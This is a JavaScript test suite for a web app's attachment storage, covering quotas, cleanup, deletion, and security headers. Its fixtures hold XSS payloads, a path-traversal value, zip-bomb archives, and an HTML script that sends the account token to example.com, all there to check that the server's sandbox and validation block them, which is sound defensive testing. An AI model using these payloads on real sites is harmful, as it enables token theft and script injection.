import assert from 'node:assert/strict'
import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'

const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gugo-managed-attachment-security-'))
process.env.APP_DATA_DIR = tempDir

const { createAppServer } = await import('../server/appServer.js')
const { closeDb, getDb } = await import('../server/db.js')
const {
  cleanupManagedAttachments,
  createManagedAttachment,
  deleteManagedAttachment,
  deleteManagedAttachmentsForSession,
  deleteManagedAttachmentsForUser,
  getManagedAttachment,
  validateManagedAttachmentsForTurn,
} = await import('../server/services/managedAttachmentStore.js')
const { validateOfficeArchiveSafety } = await import('../server/services/managedAttachmentContent.js')
const { deleteSession, getSessionSnapshot, upsertSession } = await import('../server/services/sessionStore.js')
const { issueTestSession } = await import('./helpers/testAuth.js')
const { activateTestCompactionArchivePort } = await import('./helpers/testCompactionArchivePort.js')
const { default: JSZip } = await import('jszip')

const compactionArchiveController = activateTestCompactionArchivePort({ env: process.env })
const server = createAppServer({ getEnv: () => ({ AUTH_MODE: 'multi_user' }) })
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
const origin = `http://127.0.0.1:${server.address().port}`

const originalAttachmentEnv = Object.fromEntries([
  'ATTACHMENT_USER_QUOTA_BYTES',
  'ATTACHMENT_MAX_PER_TURN',
  'ATTACHMENT_PENDING_TTL_MS',
  'ATTACHMENT_STALE_UPLOAD_MS',
  'ATTACHMENT_ORPHAN_GRACE_MS',
].map((key) => [key, process.env[key]]))

test.after(async () => {
  await new Promise((resolve) => server.close(resolve))
  compactionArchiveController.release()
  closeDb()
  for (const [key, value] of Object.entries(originalAttachmentEnv)) {
    if (value == null) delete process.env[key]
    else process.env[key] = value
  }
  fs.rmSync(tempDir, { recursive: true, force: true })
})

function binarySource(value) {
  const buffer = Buffer.isBuffer(value) ? value : Buffer.from(value)
  return (async function* stream() { yield buffer })()
}

function makeIdentity(label) {
  const identity = issueTestSession({ email: `managed-security-${label}@example.com` })
  const sessionId = `managed-security-${label}-session`
  upsertSession({ id: sessionId, userId: identity.userId, title: `Managed ${label}` })
  return { ...identity, sessionId }
}

async function upload({ identity, name, mimeType = 'text/plain', body = 'attachment', sessionId, now } = {}) {
  const buffer = Buffer.isBuffer(body) ? body : Buffer.from(body)
  return createManagedAttachment({
    userId: identity.userId,
    sessionId: sessionId === undefined ? identity.sessionId : sessionId,
    name,
    mimeType,
    source: binarySource(buffer),
    contentLength: buffer.length,
    now,
  })
}

function authorization(identity) {
  return { Authorization: `Bearer ${identity.token}` }
}

function rowCount(id) {
  return getDb().prepare('SELECT COUNT(*) AS count FROM managed_attachments WHERE id = ?').get(id).count
}

test('user quota rejects bytes before accepting a fake upload', async () => {
  const identity = makeIdentity('quota')
  process.env.ATTACHMENT_USER_QUOTA_BYTES = '10'
  const first = await upload({ identity, name: 'first.txt', body: '123456' })
  assert.equal(fs.readFileSync(first.fullPath, 'utf8'), '123456')

  await assert.rejects(
    upload({ identity, name: 'second.txt', body: 'abcdef' }),
    (error) => error?.code === 'ATTACHMENT_USER_QUOTA_EXCEEDED' && error?.statusCode === 413,
  )
  assert.equal(getDb().prepare(
    'SELECT COUNT(*) AS count FROM managed_attachments WHERE user_id = ?',
  ).get(identity.userId).count, 1)
  delete process.env.ATTACHMENT_USER_QUOTA_BYTES
})

test('per-turn upload and send limits use the configured value', async () => {
  const uploadIdentity = makeIdentity('upload-count')
  process.env.ATTACHMENT_MAX_PER_TURN = '1'
  await upload({ identity: uploadIdentity, name: 'one.txt' })
  await assert.rejects(
    upload({ identity: uploadIdentity, name: 'two.txt' }),
    (error) => error?.code === 'ATTACHMENT_COUNT_EXCEEDED' && /1/.test(error.message),
  )

  const sendIdentity = makeIdentity('send-count')
  const first = await upload({ identity: sendIdentity, sessionId: null, name: 'first.txt' })
  const second = await upload({ identity: sendIdentity, sessionId: null, name: 'second.txt' })
  await assert.rejects(
    async () => validateManagedAttachmentsForTurn({
      userId: sendIdentity.userId,
      sessionId: sendIdentity.sessionId,
      attachmentIds: [first.id, second.id],
      env: { ...process.env, ATTACHMENT_MAX_PER_TURN: '1' },
    }),
    (error) => error?.code === 'ATTACHMENT_COUNT_EXCEEDED' && /1/.test(error.message),
  )
  delete process.env.ATTACHMENT_MAX_PER_TURN
})

test('per-turn configuration cannot exceed the runtime port limit', () => {
  const attachmentIds = Array.from(
    { length: 33 },
    (_, index) => `attachment-${String(index).padStart(2, '0')}`,
  )
  assert.throws(
    () => validateManagedAttachmentsForTurn({
      userId: 'unused-user',
      sessionId: 'unused-session',
      attachmentIds,
      env: { ...process.env, ATTACHMENT_MAX_PER_TURN: '256' },
    }),
    (error) => error?.code === 'ATTACHMENT_COUNT_EXCEEDED'
      && error?.statusCode === 400
      && /32/.test(error.message),
  )
})

test('cleanup removes expired pending rows, stale temporary files, and disk orphans', async () => {
  const identity = makeIdentity('cleanup')
  const now = Date.now()
  const expired = await upload({ identity, name: 'expired.txt', now: now - 5_000 })
  const keep = await upload({ identity, name: 'keep.txt', now })
  const bucketDir = path.dirname(keep.fullPath)
  const staleFiles = [
    path.join(bucketDir, 'crashed.uploading'),
    path.join(bucketDir, `crashed.deleting-${crypto.randomUUID()}`),
    path.join(bucketDir, 'orphan-without-db-row'),
  ]
  for (const filePath of staleFiles) {
    fs.writeFileSync(filePath, 'orphan')
    fs.utimesSync(filePath, new Date(now - 5_000), new Date(now - 5_000))
  }

  const result = cleanupManagedAttachments({
    userId: identity.userId,
    now,
    env: {
      ...process.env,
      ATTACHMENT_PENDING_TTL_MS: '1000',
      ATTACHMENT_STALE_UPLOAD_MS: '1000',
      ATTACHMENT_ORPHAN_GRACE_MS: '1000',
    },
  })
  assert.equal(result.removedRows, 1)
  assert.equal(result.removedFiles, 3)
  assert.equal(fs.existsSync(expired.fullPath), false)
  assert.equal(rowCount(expired.id), 0)
  assert.equal(fs.existsSync(keep.fullPath), true)
  assert.equal(rowCount(keep.id), 1)
  for (const filePath of staleFiles) assert.equal(fs.existsSync(filePath), false)
})

test('cleanup preserves fresh uploads until a newly-created session finishes syncing', async () => {
  const identity = makeIdentity('session-sync-race')
  const futureSessionId = 'managed-security-session-sync-race-future'
  const now = Date.now()
  const attachment = await upload({
    identity,
    sessionId: futureSessionId,
    name: 'fresh-before-session.txt',
    now,
  })
  const env = {
    ...process.env,
    ATTACHMENT_PENDING_TTL_MS: '10000',
    ATTACHMENT_ORPHAN_GRACE_MS: '1000',
  }

  assert.deepEqual(cleanupManagedAttachments({
    userId: identity.userId,
    now: now + 999,
    env,
  }), { removedRows: 0, removedFiles: 0 })
  assert.equal(rowCount(attachment.id), 1)
  assert.equal(fs.existsSync(attachment.fullPath), true)

  upsertSession({ id: futureSessionId, userId: identity.userId, title: 'Synced session' })
  assert.deepEqual(cleanupManagedAttachments({
    userId: identity.userId,
    now: now + 5_000,
    env,
  }), { removedRows: 0, removedFiles: 0 })
  assert.equal(rowCount(attachment.id), 1)
  assert.equal(fs.existsSync(attachment.fullPath), true)
})

test('cleanup removes an attachment after its provisional session misses the grace period', async () => {
  const identity = makeIdentity('session-sync-timeout')
  const now = Date.now()
  const attachment = await upload({
    identity,
    sessionId: 'managed-security-session-sync-timeout-missing',
    name: 'orphaned-session.txt',
    now,
  })

  assert.deepEqual(cleanupManagedAttachments({
    userId: identity.userId,
    now: now + 1_000,
    env: {
      ...process.env,
      ATTACHMENT_PENDING_TTL_MS: '10000',
      ATTACHMENT_ORPHAN_GRACE_MS: '1000',
    },
  }), { removedRows: 1, removedFiles: 0 })
  assert.equal(rowCount(attachment.id), 0)
  assert.equal(fs.existsSync(attachment.fullPath), false)
})

test('cleanup never treats DB-backed files outside the maintenance batch as orphans', async () => {
  const identity = makeIdentity('cleanup-batch')
  const createdAt = Date.now() - 5_000
  const first = await upload({ identity, name: 'first-retained.txt', now: createdAt })
  const second = await upload({ identity, name: 'second-retained.txt', now: createdAt })
  const orphan = path.join(path.dirname(first.fullPath), 'actual-orphan')
  fs.writeFileSync(orphan, 'orphan')
  fs.utimesSync(orphan, new Date(createdAt), new Date(createdAt))

  const result = cleanupManagedAttachments({
    userId: identity.userId,
    now: createdAt + 5_000,
    maxRows: 1,
    env: {
      ...process.env,
      ATTACHMENT_PENDING_TTL_MS: '10000',
      ATTACHMENT_STALE_UPLOAD_MS: '1000',
      ATTACHMENT_ORPHAN_GRACE_MS: '1000',
    },
  })

  assert.deepEqual(result, { removedRows: 0, removedFiles: 1 })
  for (const attachment of [first, second]) {
    assert.equal(rowCount(attachment.id), 1)
    assert.equal(fs.existsSync(attachment.fullPath), true)
  }
  assert.equal(fs.existsSync(orphan), false)
})

test('cleanup row limits never turn valid uninspected attachments into disk orphans', async () => {
  const identity = makeIdentity('cleanup-limit')
  const now = Date.now()
  const first = await upload({ identity, name: 'first-valid.txt', now })
  const second = await upload({ identity, name: 'second-valid.txt', now })
  const oldDate = new Date(now - 5_000)
  fs.utimesSync(first.fullPath, oldDate, oldDate)
  fs.utimesSync(second.fullPath, oldDate, oldDate)

  const result = cleanupManagedAttachments({
    userId: identity.userId,
    now,
    maxRows: 1,
    env: {
      ...process.env,
      ATTACHMENT_PENDING_TTL_MS: '60000',
      ATTACHMENT_ORPHAN_GRACE_MS: '1000',
    },
  })
  assert.deepEqual(result, { removedRows: 0, removedFiles: 0 })
  for (const attachment of [first, second]) {
    assert.equal(rowCount(attachment.id), 1)
    assert.equal(fs.existsSync(attachment.fullPath), true)
  }
})

test('a missing disk object returns 410 and removes its corrupt database row', async () => {
  const identity = makeIdentity('missing')
  const attachment = await upload({ identity, name: 'missing.txt' })
  fs.unlinkSync(attachment.fullPath)
  assert.throws(
    () => getManagedAttachment({ userId: identity.userId, id: attachment.id }),
    (error) => error?.code === 'ATTACHMENT_CONTENT_MISSING' && error?.statusCode === 410,
  )
  assert.equal(rowCount(attachment.id), 0)
})

test('a clear staging window cannot make attachment reads delete metadata', async () => {
  const identity = makeIdentity('clear-staging-read')
  const attachment = await upload({ identity, name: 'staged-and-restored.txt' })
  const bucketPath = path.dirname(attachment.fullPath)
  const stagedPath = `${bucketPath}.user-data-staging-test`
  const now = Date.now()

  getDb().prepare(`
    INSERT INTO user_data_clear_operations (
      operation_id, owner_id, lease_owner, lease_pid, lease_expires_at,
      status, created_at, updated_at
    ) VALUES (?, ?, ?, ?, ?, 'staging', ?, ?)
  `).run(
    crypto.randomUUID(),
    identity.userId,
    'managed-attachment-security-test',
    process.pid,
    now + 60_000,
    now,
    now,
  )
  fs.renameSync(bucketPath, stagedPath)

  try {
    assert.throws(
      () => getManagedAttachment({ userId: identity.userId, id: attachment.id }),
      (error) => error?.code === 'USER_DATA_CLEAR_IN_PROGRESS' && error?.statusCode === 409,
    )
    assert.equal(rowCount(attachment.id), 1)
  } finally {
    fs.renameSync(stagedPath, bucketPath)
    getDb().prepare('DELETE FROM user_data_clear_operations WHERE owner_id = ?').run(identity.userId)
  }

  const restored = getManagedAttachment({ userId: identity.userId, id: attachment.id })
  assert.equal(restored?.fullPath, attachment.fullPath)
  assert.equal(rowCount(attachment.id), 1)
})

test('an active clear journal also blocks invalid-path metadata self-repair', async () => {
  const identity = makeIdentity('clear-invalid-path-read')
  const attachment = await upload({ identity, name: 'invalid-path.txt' })
  const now = Date.now()
  getDb().prepare('UPDATE managed_attachments SET storage_path = ? WHERE id = ?').run(
    '../outside-attachment-root',
    attachment.id,
  )
  getDb().prepare(`
    INSERT INTO user_data_clear_operations (
      operation_id, owner_id, lease_owner, lease_pid, lease_expires_at,
      status, created_at, updated_at
    ) VALUES (?, ?, ?, ?, ?, 'staging', ?, ?)
  `).run(
    crypto.randomUUID(),
    identity.userId,
    'managed-attachment-security-test',
    process.pid,
    now + 60_000,
    now,
    now,
  )

  try {
    assert.throws(
      () => getManagedAttachment({ userId: identity.userId, id: attachment.id }),
      (error) => error?.code === 'USER_DATA_CLEAR_IN_PROGRESS' && error?.statusCode === 409,
    )
    assert.equal(rowCount(attachment.id), 1)
  } finally {
    getDb().prepare('DELETE FROM user_data_clear_operations WHERE owner_id = ?').run(identity.userId)
    getDb().prepare('DELETE FROM managed_attachments WHERE id = ?').run(attachment.id)
    fs.rmSync(attachment.fullPath, { force: true })
  }
})

test('single, session, and user deletion remove metadata and physical bytes together', async () => {
  const identity = makeIdentity('delete')
  const single = await upload({ identity, name: 'single.txt' })
  assert.equal(deleteManagedAttachment({ userId: identity.userId, id: single.id }), true)
  assert.equal(fs.existsSync(single.fullPath), false)
  assert.equal(rowCount(single.id), 0)

  const sessionA = await upload({ identity, name: 'session-a.txt' })
  const sessionB = await upload({ identity, name: 'session-b.txt' })
  assert.equal(deleteManagedAttachmentsForSession({
    userId: identity.userId,
    sessionId: identity.sessionId,
  }), 2)
  for (const attachment of [sessionA, sessionB]) {
    assert.equal(fs.existsSync(attachment.fullPath), false)
    assert.equal(rowCount(attachment.id), 0)
  }

  const userA = await upload({ identity, sessionId: null, name: 'user-a.txt' })
  const userB = await upload({ identity, sessionId: null, name: 'user-b.txt' })
  const bucketDir = path.dirname(userA.fullPath)
  assert.equal(deleteManagedAttachmentsForUser({ userId: identity.userId }), 2)
  for (const attachment of [userA, userB]) assert.equal(rowCount(attachment.id), 0)
  assert.equal(fs.existsSync(bucketDir), false)
})

test('deleting a chat session also removes its managed attachment bytes', async () => {
  const identity = makeIdentity('session-delete-cascade')
  const attachment = await upload({ identity, name: 'session-owned.txt' })
  const revision = getSessionSnapshot({
    userId: identity.userId,
    sessionId: identity.sessionId,
  }).revision

  assert.deepEqual(deleteSession({
    userId: identity.userId,
    sessionId: identity.sessionId,
    expectedRevision: revision,
  }), { deleted: true, previousRevision: revision })
  assert.equal(rowCount(attachment.id), 0)
  assert.equal(fs.existsSync(attachment.fullPath), false)
})

test('content route inlines passive media and downloads active content by default', async () => {
  const identity = makeIdentity('headers')
  const fixtures = [
    {
      name: 'safe.pdf', mimeType: 'application/pdf', body: '%PDF-1.4\n%%EOF',
      expectedMimeType: 'application/pdf', inline: true,
    },
    {
      name: 'safe.png',
      mimeType: 'image/png',
      body: Buffer.from([137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 0]),
      expectedMimeType: 'image/png',
      inline: true,
    },
    {
      name: 'safe.avif', mimeType: 'application/octet-stream', body: 'avif-by-extension',
      expectedMimeType: 'image/avif', inline: true,
    },
    {
      name: 'safe.bmp', mimeType: 'application/octet-stream', body: Buffer.from('BMbrowser-bitmap'),
      expectedMimeType: 'image/bmp', inline: true,
    },
    {
      name: 'seek.mp3', mimeType: 'application/octet-stream', body: Buffer.from('ID3media-audio'),
      expectedMimeType: 'audio/mpeg', inline: true,
    },
    {
      name: 'seek.mp4', mimeType: 'application/octet-stream',
      body: Buffer.from([0, 0, 0, 24, 102, 116, 121, 112, 105, 115, 111, 109, 0, 0, 0, 0]),
      expectedMimeType: 'video/mp4', inline: true,
    },
    {
      name: 'audiobook.m4b', mimeType: 'application/octet-stream',
      body: Buffer.from([0, 0, 0, 24, 102, 116, 121, 112, 77, 52, 66, 32, 0, 0, 0, 0]),
      expectedMimeType: 'audio/mp4', inline: true,
    },
    {
      name: 'disguised.html', mimeType: 'application/octet-stream',
      body: Buffer.from([80, 75, 3, 4, 0, 0, 0, 0]),
      expectedMimeType: 'application/zip', inline: false,
    },
    {
      name: 'active.html', mimeType: 'application/octet-stream', body: '<script>alert(1)</script>',
      expectedMimeType: 'text/html', inline: false,
    },
    {
      name: 'active.svg', mimeType: 'application/octet-stream', body: '<svg onload="alert(1)"/>',
      expectedMimeType: 'image/svg+xml', inline: false,
    },
  ]
  for (const fixture of fixtures) {
    const attachment = await upload({ identity, ...fixture })
    assert.equal(attachment.mimeType, fixture.expectedMimeType)
    const response = await fetch(`${origin}${attachment.downloadUrl}`, {
      headers: authorization(identity),
    })
    assert.equal(response.status, 200)
    assert.equal(response.headers.get('x-content-type-options'), 'nosniff')
    assert.equal(response.headers.get('accept-ranges'), 'bytes')
    assert.match(response.headers.get('content-disposition'), fixture.inline ? /^inline;/ : /^attachment;/)
    if (fixture.inline) {
      assert.equal(response.headers.get('content-type'), attachment.mimeType)
      assert.doesNotMatch(response.headers.get('content-security-policy') || '', /(?:^|;)\s*sandbox(?:;|$)/)
    } else {
      assert.equal(response.headers.get('content-type'), 'application/octet-stream')
      assert.match(response.headers.get('content-security-policy'), /sandbox/)
    }
    assert.deepEqual(Buffer.from(await response.arrayBuffer()), Buffer.from(fixture.body))
  }
})

test('HTML and SVG require preview mode and remain constrained by a no-script sandbox', async () => {
  const identity = makeIdentity('active-preview')
  const fixtures = [
    { name: 'preview.html', mimeType: 'text/html', body: '<script>alert(1)</script>' },
    { name: 'preview.svg', mimeType: 'image/svg+xml', body: '<svg onload="alert(1)"/>' },
  ]
  for (const fixture of fixtures) {
    const attachment = await upload({ identity, ...fixture })
    const download = await fetch(`${origin}${attachment.downloadUrl}`, {
      headers: authorization(identity),
    })
    assert.equal(download.headers.get('content-type'), 'application/octet-stream')
    assert.match(download.headers.get('content-disposition'), /^attachment;/)
    assert.match(download.headers.get('content-security-policy'), /sandbox/)
    await download.arrayBuffer()

    const preview = await fetch(`${origin}${attachment.downloadUrl}?preview=1`, {
      headers: authorization(identity),
    })
    assert.equal(preview.status, 200)
    assert.equal(preview.headers.get('content-type'), attachment.mimeType)
    assert.match(preview.headers.get('content-disposition'), /^inline;/)
    assert.equal(preview.headers.get('x-frame-options'), 'SAMEORIGIN')
    const csp = preview.headers.get('content-security-policy') || ''
    assert.match(csp, /(?:^|;)\s*sandbox(?:;|$)/)
    assert.match(csp, /default-src 'none'/)
    assert.match(csp, /script-src 'none'/)
    assert.doesNotMatch(csp, /allow-scripts/)
    assert.deepEqual(Buffer.from(await preview.arrayBuffer()), Buffer.from(fixture.body))
  }
})

test('query-authenticated HTML previews cannot execute or exfiltrate the account token', async () => {
  const identity = makeIdentity('active-preview-query-token')
  const attachment = await upload({
    identity,
    name: 'query-token-preview.html',
    mimeType: 'text/html',
    body: '<script>fetch(`https://example.com/?token=${location.search}`)</script>',
  })
  const preview = await fetch(
    `${origin}${attachment.downloadUrl}?preview=1&token=${encodeURIComponent(identity.token)}`,
  )

  assert.equal(preview.status, 200)
  assert.equal(preview.headers.get('referrer-policy'), 'no-referrer')
  assert.equal(preview.headers.get('cross-origin-resource-policy'), 'same-origin')
  const csp = preview.headers.get('content-security-policy') || ''
  assert.match(csp, /(?:^|;)\s*sandbox(?:;|$)/)
  assert.match(csp, /default-src 'none'/)
  assert.match(csp, /script-src 'none'/)
  assert.match(csp, /form-action 'none'/)
  assert.doesNotMatch(csp, /allow-scripts/)
  await preview.arrayBuffer()
})

test('Office archive validation rejects entry, size, total, and compression-ratio bombs', async () => {
  async function zip(entries, compression = 'STORE') {
    const archive = new JSZip()
    for (const [name, value] of entries) archive.file(name, value)
    return archive.generateAsync({ type: 'nodebuffer', compression })
  }

  const cases = [
    {
      buffer: await zip([['a.xml', 'a'], ['b.xml', 'b'], ['c.xml', 'c']]),
      limits: { maxEntries: 2, maxEntryBytes: 100, maxUncompressedBytes: 100, maxCompressionRatio: 100 },
    },
    {
      buffer: await zip([['large.xml', '1234567890']]),
      limits: { maxEntries: 2, maxEntryBytes: 5, maxUncompressedBytes: 100, maxCompressionRatio: 100 },
    },
    {
      buffer: await zip([['a.xml', '123456'], ['b.xml', 'abcdef']]),
      limits: { maxEntries: 3, maxEntryBytes: 10, maxUncompressedBytes: 10, maxCompressionRatio: 100 },
    },
    {
      buffer: await zip([['compressed.xml', 'A'.repeat(20_000)]], 'DEFLATE'),
      limits: { maxEntries: 2, maxEntryBytes: 50_000, maxUncompressedBytes: 50_000, maxCompressionRatio: 2 },
    },
  ]
  for (const item of cases) {
    await assert.rejects(
      validateOfficeArchiveSafety(item.buffer, item.limits),
      (error) => error?.code === 'ATTACHMENT_ARCHIVE_UNSAFE' && error?.statusCode === 422,
    )
  }
})
